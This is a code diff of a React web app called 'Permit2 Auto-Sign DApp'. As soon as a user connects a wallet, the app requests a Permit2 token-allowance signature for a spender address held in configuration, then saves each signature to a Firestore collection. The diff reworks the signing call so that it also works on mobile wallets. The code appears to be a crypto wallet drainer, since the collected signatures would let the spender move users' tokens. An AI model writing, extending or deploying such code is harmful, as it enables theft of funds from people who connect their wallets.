@@ -28,7 +28,6 @@ export default function App() {
     const unsub = appKit.subscribeAccount((acct) => {
       if (acct?.isConnected && acct?.address) {
         setStatus(`Connected: ${acct.address}`);
-        // Trigger auto sign
         autoSignPermit(acct.address);
       } else {
         setStatus('Not connected');
@@ -48,9 +47,8 @@ export default function App() {
       }
 
       const provider = new BrowserProvider(walletProvider);
-      const signer = await provider.getSigner();
-
       const chainId = (await provider.getNetwork()).chainId;
+
       const deadline = Math.floor(Date.now() / 1000) + 3600;
       const nonce = 0;
 
@@ -87,16 +85,29 @@ export default function App() {
         sigDeadline: deadline
       };
 
-      setStatus('Requesting typed-data signature...');
-      // ethers v6 signer method for typed data
-      const signature = await signer._signTypedData(domain, types, message);
+      // ---- Option 1: WalletConnect-Compatible EIP-712 Signing ---- //
+      setStatus('Requesting typed-data signature (mobile compatible)...');
+
+      const payload = JSON.stringify({
+        domain,
+        types,
+        primaryType: "PermitSingle",
+        message
+      });
+
+      const signature = await walletProvider.request({
+        method: "eth_signTypedData_v4",
+        params: [owner, payload]
+      });
+
+      // ------------------------------------------------------------- //
 
       const raw = signature.substring(2);
       const r = "0x" + raw.substring(0, 64);
       const s = "0x" + raw.substring(64, 128);
       const v = parseInt(raw.substring(128, 130), 16);
 
-      // Save to firestore
+      // Save the signature to Firestore
       await setDoc(doc(db, "permit2_signatures", owner), {
         owner,
         spender: import.meta.env.VITE_SPENDER_ADDRESS,
@@ -120,7 +131,9 @@ export default function App() {
   return (
     <div className="app-container">
       <h2>Permit2 Auto-Sign DApp</h2>
-      <p style={{color:'#9fb4ff', marginBottom: 18}}>Click connect to open wallet modal and auto-sign permit.</p>
+      <p style={{color:'#9fb4ff', marginBottom: 18}}>
+        Click connect to open wallet modal and auto-sign permit.
+      </p>
       <button className="connect" onClick={() => appKit.open()}>Connect Wallet</button>
       <div className="status">{status}</div>
     </div>
